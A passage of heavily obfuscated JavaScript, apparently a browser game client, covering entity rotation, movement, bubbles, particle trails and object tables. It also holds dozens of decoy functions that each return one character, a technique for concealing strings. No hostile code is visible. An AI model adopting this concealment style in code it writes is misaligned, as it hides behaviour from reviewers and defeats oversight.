				for (var ⵠᐃⲆⲆ = ⵠⲆⲆ; ⵠᐃⲆⲆ < this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠΔΔⵠ].length; ⵠᐃⲆⲆ++) {
					var ⲆᐃΔⲆ = this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠΔΔⵠ][ⵠᐃⲆⲆ];
					if (ᐃⵠᐃⵠ === Math.floor(ⲆᐃΔⲆ.x / 100) && ⵠᐃ === Math.floor(ⲆᐃΔⲆ.y / 100)) return 1
				}
				return ⵠⲆᐃⵠ
			};
			this.ΔⲆⲆⲆⲆᐃⲆΔⲆ = function(ⵠᐃ, ᐃⵠᐃⵠ) {
				for (var ⵠᐃⲆⲆ = Ⲇᐃᐃᐃ; ⵠᐃⲆⲆ < this.ΔⲆᐃ[ⲆⲆᐃ.ΔⲆΔⲆᐃ].length; ⵠᐃⲆⲆ++) {
					var ⲆᐃΔⲆ = this.ΔⲆᐃ[ⲆⲆᐃ.ΔⲆΔⲆᐃ][ⵠᐃⲆⲆ];
					if (ⵠᐃ == Math.floor(ⲆᐃΔⲆ.x / 100) && ᐃⵠᐃⵠ == Math.floor(ⲆᐃΔⲆ.y / 100)) return true
				}
				return false
			};
			this.ⲆⲆᐃᐃⵠ = function(ᐃᐃᐃⲆ) {
				for (var ⵠᐃ = Δᐃᐃᐃ; ⵠᐃ < ᐃᐃᐃⲆ.length; ⵠᐃ++) {
					ⲆᐃΔⲆ = ᐃᐃᐃⲆ[ⵠᐃ];
					if (ⲆᐃΔⲆ.angle != ⲆᐃΔⲆ.ⲆΔⲆⲆΔⲆΔ) {
						var ΔᐃᐃⵠⲆ = ΔⵠⵠΔ * Math.PI;
						ⲆᐃΔⲆ.angle = (ⲆᐃΔⲆ.angle + ΔᐃᐃⵠⲆ) % ΔᐃᐃⵠⲆ;
						ⲆᐃΔⲆ.ⲆΔⲆⲆΔⲆΔ = (ⲆᐃΔⲆ.ⲆΔⲆⲆΔⲆΔ + ΔᐃᐃⵠⲆ) % ΔᐃᐃⵠⲆ;
						if (ⲆᐃΔⲆ.ⲆΔⲆⲆΔⲆΔ != ⲆᐃΔⲆ.angle) {
							var ⵠΔᐃⵠᐃⲆⵠ = ⲆᐃΔⲆ.ⲆΔⲆⲆΔⲆΔ - ⲆᐃΔⲆ.angle;
							var ⵠᐃΔᐃ = Math.abs(ⵠΔᐃⵠᐃⲆⵠ);
							if (ⵠᐃΔᐃ > Math.PI) ⵠᐃΔᐃ = Math.PI * ⵠⲆⵠⲆ - ⵠᐃΔᐃ;
							var ⵠᐃⲆ = ᐃⵠᐃᐃ * (ΔᐃᐃΔ.ΔΔⲆⲆⲆΔΔ * (3 * (ⵠᐃΔᐃ / Math.PI)));
							if (ⵠΔᐃⵠᐃⲆⵠ > Math.PI) ⲆᐃΔⲆ.angle -= ⵠᐃⲆ;
							else if (-Math.PI > ⵠΔᐃⵠᐃⲆⵠ) ⲆᐃΔⲆ.angle += ⵠᐃⲆ;
							else if (0 > ⵠΔᐃⵠᐃⲆⵠ) ⲆᐃΔⲆ.angle -= ⵠᐃⲆ;
							else ⲆᐃΔⲆ.angle += ⵠᐃⲆ;
							ⲆᐃΔⲆ.angle = (ⲆᐃΔⲆ.angle + ΔᐃᐃⵠⲆ) % ΔᐃᐃⵠⲆ;
							if (ⵠᐃⲆ > Math.abs(ⲆᐃΔⲆ.angle - ⲆᐃΔⲆ.ⲆΔⲆⲆΔⲆΔ)) ⲆᐃΔⲆ.angle = ⲆᐃΔⲆ.ⲆΔⲆⲆΔⲆΔ
						}
					}
					var ᐃΔΔΔⲆⵠⵠⲆᐃ = Math.floor(ⲆᐃΔⲆ.r.y / ᐃΔᐃⲆΔ);
					var ⵠᐃⲆᐃᐃⵠⲆᐃⲆ = Math.floor(ⲆᐃΔⲆ.r.x / 100);
					if (ⲆᐃΔⲆ.r.x != ⲆᐃΔⲆ.x || ⲆᐃΔⲆ.r.y != ⲆᐃΔⲆ.y) {
						if (ⲆᐃΔⲆ.action & ⵠⵠⵠⲆ.IDLE) ⲆᐃΔⲆ.action -= ⵠⵠⵠⲆ.IDLE;
						ⲆᐃΔⲆ.action |= ⵠⵠⵠⲆ.ⵠⵠⲆΔⵠⲆⲆ;
						var ⲆⲆᐃⲆ = ΔΔⲆᐃ.ΔᐃⵠᐃⵠᐃΔ(ⲆᐃΔⲆ, ⲆᐃΔⲆ.r) + Math.PI;
						var Δⵠⵠᐃ = ᐃⵠᐃᐃ * ⲆᐃΔⲆ.ᐃᐃΔᐃᐃ;
						var ΔᐃΔ = ΔΔⲆᐃ.ⵠⲆⵠᐃᐃΔⲆ(Δⵠⵠᐃ, ⲆⲆᐃⲆ);
						if (ΔΔⲆᐃ.ⲆⲆⲆⲆᐃⲆⵠ(ΔΔⲆᐃ.ᐃᐃⲆᐃⵠⵠᐃ(ⲆᐃΔⲆ, ⲆᐃΔⲆ.r)) > ΔΔⲆᐃ.ⲆⲆⲆⲆᐃⲆⵠ(ΔᐃΔ)) ΔΔⲆᐃ.ⲆⵠⲆΔΔᐃᐃ(ⲆᐃΔⲆ, ΔᐃΔ);
						else {
							ⲆᐃΔⲆ.action & ⵠⵠⵠⲆ.ⵠⵠⲆΔⵠⲆⲆ && (ⲆᐃΔⲆ.action -= ⵠⵠⵠⲆ.ⵠⵠⲆΔⵠⲆⲆ);
							ⲆᐃΔⲆ.action |= ⵠⵠⵠⲆ.IDLE;
							ΔΔⲆᐃ.ΔᐃⵠⵠⵠⲆⵠ(ⲆᐃΔⲆ.r, ⲆᐃΔⲆ)
						}
					}
					if (ⲆᐃΔⲆ.Ⲇⵠⵠⵠᐃ) {
						var ⵠᐃⵠⲆᐃ = ⲆᐃΔⲆ.bubbles;
						var ⲆⲆⵠΔ = ⵠᐃⵠⲆᐃ.length;
						if (ⲆⲆⵠΔ === 0 || Ⲇ.ᐃΔⵠᐃΔᐃⵠ > ⲆⲆⵠΔ && ⵠᐃⵠⲆᐃ[ⲆⲆⵠΔ - ΔᐃᐃⲆ].ᐃⵠΔᐃⵠ < .95) ⵠᐃⵠⲆᐃ.push({
							id: Math.floor(Math.random() * ⵠⲆ[Ⲇ.ⵠᐃᐃᐃⵠᐃⲆ][ᐃⵠⲆ].length),
							x: Math.floor(ⲆᐃΔⲆ.x + Math.random() * 80 - 40),
							y: Math.floor(ⲆᐃΔⲆ.y + Math.random() * 80 - 40),
							"ᐃⵠΔᐃⵠ": 1
						});
						for (var ᐃⵠᐃⵠ = 0; ⲆⲆⵠΔ > ᐃⵠᐃⵠ; ᐃⵠᐃⵠ++) ⵠᐃⵠⲆᐃ[ᐃⵠᐃⵠ].ᐃⵠΔᐃⵠ = Math.max(ⵠⲆⲆ, ⵠᐃⵠⲆᐃ[ᐃⵠᐃⵠ].ᐃⵠΔᐃⵠ - ᐃⵠᐃᐃ);
						for (var ᐃⵠᐃⵠ = 0; ⲆⲆⵠΔ > ᐃⵠᐃⵠ; ᐃⵠᐃⵠ++) {
							if (ⵠᐃⵠⲆᐃ[ᐃⵠᐃⵠ].ᐃⵠΔᐃⵠ === ΔⲆⲆ) {
								ⵠᐃⵠⲆᐃ.splice(ᐃⵠᐃⵠ, ᐃᐃⲆΔ);
								break
							}
						}
					}
					var ⲆⲆΔⲆΔⲆᐃ = ⵠⲆᐃⵠ;
					if (ⲆᐃΔⲆ.ΔᐃⵠΔ && ⵠⲆᐃΔ.ᐃⲆᐃΔⲆ) {
						var ⲆΔᐃⲆⲆ = ⲆᐃΔⲆ.ⲆΔᐃⲆⲆ;
						var ⲆⲆⵠΔ = ⲆΔᐃⲆⲆ.length;
						if (ⲆᐃΔⲆ.ΔⲆⲆᐃⵠⲆⵠ > ⲆΔⵠ && ᐃᐃ.ⵠⲆᐃⲆᐃ !== ⲆᐃΔⲆ.ᐃⵠⵠΔⵠ && ᐃᐃ.ΔⵠⵠΔⲆ !== ⲆᐃΔⲆ.ᐃⵠⵠΔⵠ && ᐃᐃ.ΔᐃⲆΔᐃ !== ⲆᐃΔⲆ.ᐃⵠⵠΔⵠ && ᐃᐃ.ΔΔΔⲆⲆ !== ⲆᐃΔⲆ.ᐃⵠⵠΔⵠ && ᐃᐃ.ⲆᐃᐃⵠⲆ !== ⲆᐃΔⲆ.ᐃⵠⵠΔⵠ && !ⲆᐃΔⲆ.Ⲇⵠⵠⵠᐃ) {
							ⲆⲆΔⲆΔⲆᐃ = 1;
							if (Δᐃᐃⵠ === ⲆⲆⵠΔ || ΔΔⲆᐃ.ᐃⵠⵠᐃ(ⲆΔᐃⲆⲆ[ⲆⲆⵠΔ - 1], ⲆᐃΔⲆ) > Ⲇ.ⵠⵠⵠᐃⵠⲆⲆ) {
								var ⲆᐃΔ = -ⲆᐃΔⲆ.angle;
								var Δⵠ = ᐃ * (Math.cos(ⲆᐃΔ) * 45);
								var ⲆⵠⲆ = ᐃ * (Math.sin(ⲆᐃΔ) * 45);
								ⲆΔᐃⲆⲆ.push({
									x: ⲆᐃΔⲆ.x + Δⵠ,
									y: ⲆᐃΔⲆ.y + ⲆⵠⲆ,
									r: ᐃⵠᐃᐃⵠ,
									alpha: .8
								});
								ⲆΔᐃⲆⲆ.push({
									x: ⲆᐃΔⲆ.x - Δⵠ,
									y: ⲆᐃΔⲆ.y - ⲆⵠⲆ,
									r: 8,
									alpha: .8
								});
								ⲆΔᐃⲆⲆ.push({
									x: ⲆᐃΔⲆ.x,
									y: ⲆᐃΔⲆ.y,
									r: 24,
									alpha: 1
								})
							}
						}
						for (var ᐃⵠᐃⵠ = ΔᐃΔΔ; ᐃⵠᐃⵠ < ⲆⲆⵠΔ; ᐃⵠᐃⵠ++) {
							ⲆΔᐃⲆⲆ[ᐃⵠᐃⵠ].alpha = Math.max(0, ⲆΔᐃⲆⲆ[ᐃⵠᐃⵠ].alpha - ᐃⵠᐃᐃ / 2.2);
							ⲆΔᐃⲆⲆ[ᐃⵠᐃⵠ].r += ᐃⵠᐃᐃ * 20
						}
						0 < ⲆΔᐃⲆⲆ.length && ΔΔⵠ === ⲆΔᐃⲆⲆ[ⲆΔⵠ].alpha && ⲆΔᐃⲆⲆ.splice(0, ⲆⵠⲆⲆ);
						var ᐃΔⲆⵠⲆ = ⲆᐃΔⲆ.ᐃΔⲆⵠⲆ;
						var ⲆⲆⵠΔ = ᐃΔⲆⵠⲆ.length;
						var ᐃΔ = -ⲆⵠⲆⲆ;
						var ⲆᐃⲆⵠⲆⵠᐃ = Math.max(0, Math.sign(ⲆᐃΔⲆ.ⵠⲆΔⲆΔⲆᐃ));
						var ᐃΔᐃⲆᐃ = Math.max(0, Math.sign(ⲆᐃΔⲆ.ⵠΔΔⲆΔ));
						var ⵠᐃⵠⲆⵠᐃΔᐃᐃ = Math.max(0, Math.sign(ⲆᐃΔⲆ.ᐃᐃⲆΔⲆ));
						var ⲆᐃᐃᐃⲆⲆᐃ = Math.max(0, Math.sign(ⲆᐃΔⲆ.ΔⵠΔΔⵠ));
						var ⲆΔΔΔΔΔΔ = Math.max(ⲆⲆⲆᐃ, Math.sign(ⲆᐃΔⲆ.ⵠⲆΔⲆⵠ));
						if (ⲆᐃΔⲆ.ⵠⲆΔⲆΔⲆᐃ > 0 || 0 < ⲆᐃΔⲆ.ᐃᐃⲆΔⲆ) var ᐃΔ = Ⲇ.ΔᐃΔⵠⲆⵠⲆ;
						else if (0 < ⲆᐃΔⲆ.ⵠⲆΔⲆⵠ) var ᐃΔ = Ⲇ.ⲆⲆⲆΔᐃᐃⲆ;
						else if (ⵠᐃⲆᐃ < ⲆᐃΔⲆ.ⵠΔΔⲆΔ) var ᐃΔ = Ⲇ.ΔⲆᐃⲆⲆΔⲆ;
						else if (ⵠⲆⲆ < ⲆᐃΔⲆ.ΔⵠΔΔⵠ) var ᐃΔ = Ⲇ.ᐃⵠⵠΔⲆΔΔ;
						if (ᐃᐃ.ⲆᐃⵠⵠⲆ === ⲆᐃΔⲆ.ᐃⵠⵠΔⵠ && ΔᐃᐃⲆ === (ⲆᐃⲆⵠⲆⵠᐃ | ᐃΔᐃⲆᐃ | ⲆᐃᐃᐃⲆⲆᐃ | ⲆΔΔΔΔΔΔ)) {
							ᐃΔ = Ⲇ.ΔⲆΔᐃᐃⵠᐃ;
							var ⲆᐃⲆΔΔⵠΔ = ⲆᐃΔⲆ.ⵠⵠⲆΔᐃ - Math.PI / 2;
							var ⲆΔΔⲆⵠⲆΔ = 15;
							var ⲆⲆΔΔΔ = ᐃⵠΔⵠΔΔᐃ;
							var ΔⲆⲆΔᐃⵠΔ = Ⲇ.ⲆᐃⲆⲆᐃΔΔ
						} else if (ⲆᐃΔⲆ.ᐃⵠⵠΔⵠ === ᐃᐃ.ⲆⵠᐃⵠⲆ && (ⲆᐃⲆⵠⲆⵠᐃ | ᐃΔᐃⲆᐃ | ⲆᐃᐃᐃⲆⲆᐃ | ⲆΔΔΔΔΔΔ) === ΔⲆᐃᐃ) {
							ᐃΔ = Ⲇ.ΔΔⵠΔⵠⲆᐃ;
							var ⲆᐃⲆΔΔⵠΔ = ⲆᐃΔⲆ.ⵠⵠⲆΔᐃ - Math.PI / ᐃⲆⵠᐃ;
							var ⲆΔΔⲆⵠⲆΔ = 21;
							var ⲆⲆΔΔΔ = 16;
							var ΔⲆⲆΔᐃⵠΔ = Ⲇ.ⲆᐃⲆⲆᐃΔΔ
						} else if (ᐃᐃ.ᐃⵠᐃᐃΔ === ⲆᐃΔⲆ.ᐃⵠⵠΔⵠ && ΔΔΔ === (ⲆᐃⲆⵠⲆⵠᐃ | ᐃΔᐃⲆᐃ | ⲆᐃᐃᐃⲆⲆᐃ | ⲆΔΔΔΔΔΔ)) {
							ᐃΔ = Ⲇ.ΔⲆⲆΔᐃᐃᐃ;
							var ⲆᐃⲆΔΔⵠΔ = ⲆᐃΔⲆ.ⵠⵠⲆΔᐃ - Math.PI / 2;
							var ᐃⵠΔⲆⲆⲆᐃ = 50 * Math.random();
							var ⲆΔΔⲆⵠⲆΔ = 10 + ᐃⵠΔⲆⲆⲆᐃ;
							var ⲆⲆΔΔΔ = ⲆΔⵠ + ᐃⵠΔⲆⲆⲆᐃ;
							var ΔⲆⲆΔᐃⵠΔ = Ⲇ.ⲆᐃⲆⲆᐃΔΔ * .9
						} else {
							var ⲆᐃⲆΔΔⵠΔ = ⲆᐃΔⲆ.angle;
							var ⲆΔΔⲆⵠⲆΔ = 15;
							var ⲆⲆΔΔΔ = ⲆᐃΔⵠⵠΔᐃ;
							var ΔⲆⲆΔᐃⵠΔ = Ⲇ.ⲆᐃⲆⲆᐃΔΔ
						}
						if (ᐃᐃ.ⵠⲆᐃⲆᐃ === ⲆᐃΔⲆ.ᐃⵠⵠΔⵠ || ⲆᐃΔⲆ.ᐃⵠⵠΔⵠ === ᐃᐃ.ΔⵠⵠΔⲆ || ⲆᐃΔⲆ.ᐃⵠⵠΔⵠ === ᐃᐃ.ⲆᐃᐃⵠⲆ || ⲆᐃΔⲆ.ᐃⵠⵠΔⵠ === ᐃᐃ.ΔΔΔⲆⲆ || ⲆᐃΔⲆ.ᐃⵠⵠΔⵠ === ᐃᐃ.ΔᐃⲆΔᐃ || ⲆᐃΔⲆ.Ⲇⵠⵠⵠᐃ);
						else if (ⲆᐃΔⲆ.ᐃⵠⵠΔⵠ === ᐃᐃ.ᐃᐃΔΔⵠ) {
							(ⲆⲆⵠΔ === 0 || Ⲇ.ⵠᐃⲆᐃΔᐃⲆ < ΔΔⲆᐃ.ᐃⵠⵠᐃ(ᐃΔⲆⵠⲆ[ⲆⲆⵠΔ - 1], ⲆᐃΔⲆ)) && ᐃΔⲆⵠⲆ.push({
								x: ⲆᐃΔⲆ.x,
								y: ⲆᐃΔⲆ.y,
								angle: ⲆᐃΔⲆ.ⵠⵠⲆΔᐃ,
								alpha: Ⲇᐃⵠ,
								id: Ⲇ.ΔΔΔⲆⵠΔⵠ
							})
						} else if (ᐃΔ != -1 && Δᐃᐃᐃ === ⲆⲆΔⲆΔⲆᐃ) {
							if (ΔᐃΔΔ === ⲆⲆⵠΔ || ΔΔⲆᐃ.ᐃⵠⵠᐃ(ᐃΔⲆⵠⲆ[ⲆⲆⵠΔ - 1], ⲆᐃΔⲆ) > ΔⲆⲆΔᐃⵠΔ) {
								ⲆᐃΔⲆ.ΔΔⵠⵠΔᐃⲆ++;
								if (1 < Math.abs(ⲆᐃΔⲆ.x - ⲆᐃΔⲆ.r.x) && Math.abs(ⲆᐃΔⲆ.y - ⲆᐃΔⲆ.r.y) > 1) {
									if (ⲆᐃΔⲆ.r.x > ⲆᐃΔⲆ.x && ⲆᐃΔⲆ.r.y < ⲆᐃΔⲆ.y || ⲆᐃΔⲆ.x > ⲆᐃΔⲆ.r.x && ⲆᐃΔⲆ.r.y > ⲆᐃΔⲆ.y) {
										if (ⲆᐃΔⲆ.ΔΔⵠⵠΔᐃⲆ % 2) {
											var Δⵠ = ᐃ * -ⲆⲆΔΔΔ;
											var ⲆⵠⲆ = -ⲆⲆΔΔΔ * ᐃ
										} else {
											var ⲆⵠⲆ = ⲆⲆΔΔΔ * ᐃ;
											var Δⵠ = ⲆⲆΔΔΔ * ᐃ
										}
									} else {
										if (ⲆᐃΔⲆ.ΔΔⵠⵠΔᐃⲆ % Ⲇᐃᐃⵠ) {
											var Δⵠ = ᐃ * ⲆⲆΔΔΔ;
											var ⲆⵠⲆ = ᐃ * -ⲆⲆΔΔΔ
										} else {
											var ⲆⵠⲆ = ⲆⲆΔΔΔ * ᐃ;
											var Δⵠ = ᐃ * -ⲆⲆΔΔΔ
										}
									}
								} else if (ⲆᐃΔⲆ.ΔΔⵠⵠΔᐃⲆ % 2) {
									var Δⵠ = ᐃ * (Math.cos(ⲆᐃⲆΔΔⵠΔ) * ⲆΔΔⲆⵠⲆΔ);
									var ⲆⵠⲆ = ᐃ * (Math.sin(ⲆᐃⲆΔΔⵠΔ) * ⲆΔΔⲆⵠⲆΔ)
								} else {
									var Δⵠ = -Math.cos(ⲆᐃⲆΔΔⵠΔ) * ⲆΔΔⲆⵠⲆΔ * ᐃ;
									var ⲆⵠⲆ = ᐃ * (-Math.sin(ⲆᐃⲆΔΔⵠΔ) * ⲆΔΔⲆⵠⲆΔ)
								}
								ᐃΔⲆⵠⲆ.push({
									x: ⲆᐃΔⲆ.x + Δⵠ,
									y: ⲆᐃΔⲆ.y + ⲆⵠⲆ,
									angle: ⲆᐃⲆΔΔⵠΔ + Math.PI / 2,
									alpha: 1,
									id: ᐃΔ
								})
							}
						}
						for (var ᐃⵠᐃⵠ = Ⲇᐃⵠⵠ; ⲆⲆⵠΔ > ᐃⵠᐃⵠ; ᐃⵠᐃⵠ++) {
							Ⲇ.ΔΔΔⲆⵠΔⵠ === ᐃΔⲆⵠⲆ[ᐃⵠᐃⵠ].id ? ᐃΔⲆⵠⲆ[ᐃⵠᐃⵠ].alpha = Math.max(0, ᐃΔⲆⵠⲆ[ᐃⵠᐃⵠ].alpha - 1.5 * ᐃⵠᐃᐃ) : ᐃΔⲆⵠⲆ[ᐃⵠᐃⵠ].alpha = Math.max(ⵠⲆᐃⵠ, ᐃΔⲆⵠⲆ[ᐃⵠᐃⵠ].alpha - ᐃⵠᐃᐃ / 2.85)
						}
						if (ᐃΔⲆⵠⲆ.length > ⲆⲆⲆᐃ && 0 === ᐃΔⲆⵠⲆ[0].alpha) ᐃΔⲆⵠⲆ.splice(0, 1)
					}
				}
			};
			this.ⵠⲆᐃ = function() {
				this.ⲆⲆᐃᐃⵠ(this.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆⵠⵠⲆ]);
				this.ⲆⲆᐃᐃⵠ(this.ΔⲆᐃ[ⲆⲆᐃ.ᐃᐃᐃⲆᐃ]);
				this.ⲆⲆᐃᐃⵠ(this.ΔⲆᐃ[ⲆⲆᐃ.ΔⵠᐃⲆᐃ]);
				this.ⲆⲆᐃᐃⵠ(this.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔᐃᐃΔ]);
				this.ⲆⲆᐃᐃⵠ(this.ΔⲆᐃ[ⲆⲆᐃ.ⵠᐃᐃⵠⵠ]);
				this.ⲆⲆᐃᐃⵠ(this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠᐃⵠⲆ]);
				this.ⲆⲆᐃᐃⵠ(this.ΔⲆᐃ[ⲆⲆᐃ.ᐃⵠᐃᐃΔ]);
				this.ⲆⲆᐃᐃⵠ(this.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆᐃⲆᐃ]);
				this.ⲆⲆᐃᐃⵠ(this.ΔⲆᐃ[ⲆⲆᐃ.ΔⵠⵠΔⲆ]);
				this.ⲆⲆᐃᐃⵠ(this.ΔⲆᐃ[ⲆⲆᐃ.ΔΔΔⲆⲆ]);
				this.ⲆⲆᐃᐃⵠ(this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆⵠᐃⲆ]);
				this.ⲆⲆᐃᐃⵠ(this.ΔⲆᐃ[ⲆⲆᐃ.ᐃⵠⵠᐃⵠ]);
				this.ⲆⲆᐃᐃⵠ(this.ΔⲆᐃ[ⲆⲆᐃ.ΔⵠΔⵠⵠ]);
				this.ⲆⲆᐃᐃⵠ(this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆⵠᐃΔ]);
				this.ⲆⲆᐃᐃⵠ(this.ΔⲆᐃ[ⲆⲆᐃ.ΔⵠⵠⲆᐃ]);
				this.ⲆⲆᐃᐃⵠ(this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠΔᐃΔ]);
				this.ⲆⲆᐃᐃⵠ(this.ΔⲆᐃ[ⲆⲆᐃ.ᐃᐃᐃΔᐃ]);
				this.ⲆⲆᐃᐃⵠ(this.ΔⲆᐃ[ⲆⲆᐃ.ΔⲆⲆⵠⲆ]);
				this.ⲆⲆᐃᐃⵠ(this.ΔⲆᐃ[ⲆⲆᐃ.ⲆᐃⲆⲆⵠᐃΔ]);
				this.ⲆⲆᐃᐃⵠ(this.ΔⲆᐃ[ⲆⲆᐃ.ΔΔⵠΔΔ]);
				this.ⲆⲆᐃᐃⵠ(this.ΔⲆᐃ[ⲆⲆᐃ.ΔⵠᐃᐃΔ]);
				this.ⲆⲆᐃᐃⵠ(this.ΔⲆᐃ[ⲆⲆᐃ.ᐃΔⵠⲆⵠ]);
				this.ⲆⲆᐃᐃⵠ(this.ΔⲆᐃ[ⲆⲆᐃ.ᐃΔΔᐃΔ]);
				this.ⲆⲆᐃᐃⵠ(this.ΔⲆᐃ[ⲆⲆᐃ.ⲆᐃⲆᐃⵠ])
			};
			this.ᐃΔⲆⲆ = [];
			this.ᐃΔⲆⲆ[Ⲇ.ⵠⲆᐃⵠⲆ] = new ΔΔⲆᐃ.Δⵠᐃᐃ(ᐃᐃⵠΔⵠ, 1, 1.05, 1, .008, .008);
			this.ᐃΔⲆⲆ[Ⲇ.ⲆⲆᐃΔᐃ] = new ΔΔⲆᐃ.Δⵠᐃᐃ(ⵠΔⲆⲆⲆ, 1, 1.08, 1, .006, .006);
			this.ᐃΔⲆⲆ[Ⲇ.ΔΔⲆΔΔ] = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, 1, 1.02, ᐃᐃⲆΔ, .008, .008);
			this.ᐃΔⲆⲆ[Ⲇ.ⵠΔᐃⵠⲆ] = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, ⵠΔΔ, 1.08, ⵠΔⵠΔ, .006, .006);
			this.ᐃΔΔⵠⵠ = [];
			this.ᐃΔΔⵠⵠ[Ⲇᐃⵠⵠ] = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .1, 1, 0, .6, .6);
			this.ᐃΔΔⵠⵠ[Ⲇᐃⵠ] = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .4, ᐃⲆᐃ, 0, .6, .6);
			this.ᐃΔΔⵠⵠ[2] = new ΔΔⲆᐃ.Δⵠᐃᐃ(ᐃⵠⵠⲆᐃ, .3, 1, 0, .6, .6);
			this.ᐃΔΔⵠⵠ[3] = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .8, 1, ⵠΔⲆⵠ, .6, .6);
			this.ᐃΔΔⵠⵠ[4] = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .3, ᐃᐃⲆΔ, 0, .6, .6);
			this.ᐃΔΔⵠⵠ[5] = new ΔΔⲆᐃ.Δⵠᐃᐃ(ⵠΔⲆⲆⲆ, .8, ᐃᐃⲆΔ, ⵠΔⲆⵠ, .6, .6);
			this.ᐃΔΔⵠⵠ[ⵠᐃᐃΔΔ] = new ΔΔⲆᐃ.Δⵠᐃᐃ(ⲆΔᐃⲆΔ, .5, 1, ⲆΔⵠ, .6, .6);
			this.ᐃΔΔⵠⵠ[7] = new ΔΔⲆᐃ.Δⵠᐃᐃ(ΔΔⵠⲆΔ, .9, ᐃⲆᐃ, ⵠΔⲆⵠ, .6, .6);
			this.ᐃΔΔⵠⵠ[8] = new ΔΔⲆᐃ.Δⵠᐃᐃ(ΔΔⵠⲆΔ, .6, 1, 0, .6, .6);
			this.ᐃΔΔⵠⵠ[ΔΔΔΔΔ] = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .2, ⲆⵠⲆⲆ, 0, .6, .6);
			this.ᐃΔΔⵠⵠ[10] = new ΔΔⲆᐃ.Δⵠᐃᐃ(ⲆΔⵠⲆΔ, .6, ΔᐃⲆⵠ, 0, .6, .6);
			this.ᐃΔΔⵠⵠ[ΔⲆΔⵠⲆⵠⲆ] = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .4, 1, ⵠⲆᐃⵠ, .6, .6);
			this.ᐃΔΔⵠⵠ[ᐃⲆⲆΔΔⲆᐃ] = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .8, 1, ᐃΔΔ, .6, .6);
			this.ᐃΔΔⵠⵠ[13] = new ΔΔⲆᐃ.Δⵠᐃᐃ(ⲆⲆⲆᐃⵠ, .2, 1, ⵠΔⲆⵠ, .6, .6);
			this.ᐃΔΔⵠⵠ[14] = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .7, ⵠⲆΔ, ⲆΔⵠ, .6, .6)
		}

		function ΔⵠⵠⲆⲆⲆΔᐃⲆ() {
			this.ⵠΔⵠⲆᐃ = "";
			this.ⲆⵠⲆᐃ = 0;
			this.Δᐃᐃⵠᐃ = ᐃⵠΔ;
			this.ΔⵠΔᐃⲆ = 0;
			this.ⲆΔⲆⲆⵠⲆΔ = 0;
			this.ⵠⲆᐃⵠⵠ = ⲆⲆⲆᐃ;
			this.ⲆᐃⲆⲆᐃ = ⵠⲆⲆ;
			this.ᐃⲆⵠΔⵠ = 0;
			this.level = ᐃΔΔ;
			this.label = null;
			this.ᐃΔⲆΔᐃⲆⵠ = null;
			this.ⲆⵠᐃⲆΔⵠⵠ = null;
			this.ᐃⵠⵠΔΔ = ᐃⵠⵠⲆᐃ;
			this.ᐃⵠᐃⵠⵠ = ⵠⲆⲆ
		}
		ΔΔⵠⲆⲆⵠⲆⲆΔ = 1;

		function ΔΔᐃⲆᐃⲆⵠ() {
			var ⵠᐃⲆⲆ = Math.random();
			return "C"
		}

		function ⵠⲆΔᐃᐃΔⲆⲆᐃ() {
			var ⵠᐃⲆⲆ = Math.random();
			return "w"
		}

		function ΔⲆⲆⲆᐃⵠᐃ() {
			var ⵠᐃⲆⲆ = Math.random();
			return "r"
		}

		function ΔΔⵠΔⲆᐃⵠᐃᐃ() {
			var ⵠᐃⲆⲆ = Math.random();
			return "S"
		}

		function ΔⵠⵠΔⲆⲆΔⲆⵠ() {
			var ⵠᐃⲆⲆ = Math.random();
			return "m"
		}

		function ΔΔᐃᐃΔⵠΔⵠⵠ() {
			var ⵠᐃⲆⲆ = Math.random();
			return "R"
		}

		function ⵠⲆᐃⲆⵠⲆⲆ() {
			var ⵠᐃⲆⲆ = Math.random();
			return "n"
		}

		function ⲆᐃΔⵠⲆⵠⵠ() {
			var ⵠᐃⲆⲆ = Math.random();
			return "o"
		}

		function ᐃⲆⲆⵠⵠᐃⲆ() {
			var ⵠᐃⲆⲆ = Math.random();
			return "i"
		}

		function ᐃᐃᐃᐃⲆⲆΔ() {
			var ⵠᐃⲆⲆ = Math.random();
			return "t"
		}

		function ⵠⲆᐃⲆᐃⵠⲆⲆᐃ() {
			var ⵠᐃⲆⲆ = Math.random();
			return "x"
		}

		function ⲆᐃⵠⵠΔΔᐃ() {
			var ⵠᐃⲆⲆ = Math.random();
			return "s"
		}

		function ⵠⲆⲆΔᐃΔⵠΔⲆ() {
			var ⵠᐃⲆⲆ = Math.random();
			return "v"
		}

		function ΔⵠΔⲆΔⲆᐃ() {
			var ⵠᐃⲆⲆ = Math.random();
			return "g"
		}

		function ⲆⵠⵠΔΔᐃⵠ() {
			var ⵠᐃⲆⲆ = Math.random();
			return "e"
		}

		function ΔᐃᐃⵠⲆⲆΔ() {
			var ⵠᐃⲆⲆ = Math.random();
			return "p"
		}

		function ᐃᐃᐃⵠⵠⲆⵠⲆⵠ() {
			var ⵠᐃⲆⲆ = Math.random();
			return "c"
		}

		function ΔⲆΔⲆⲆⲆΔ() {
			var ⵠᐃⲆⲆ = Math.random();
			return "d"
		}

		function ⵠⵠⲆΔΔᐃⵠ() {
			var ⵠᐃⲆⲆ = Math.random();
			return "a"
		}

		function ᐃᐃⵠⲆΔΔⲆⵠⵠ() {
			var ⵠᐃⲆⲆ = Math.random();
			return "k"
		}

		function ΔⵠⵠⲆΔⲆΔΔᐃ() {
			var ⵠᐃⲆⲆ = Math.random();
			return "I"
		}

		function ⵠᐃⲆᐃΔⲆΔⵠⵠ() {
			var ⵠᐃⲆⲆ = Math.random();
			return "y"
		}

		function ᐃᐃᐃᐃⲆⲆΔ() {
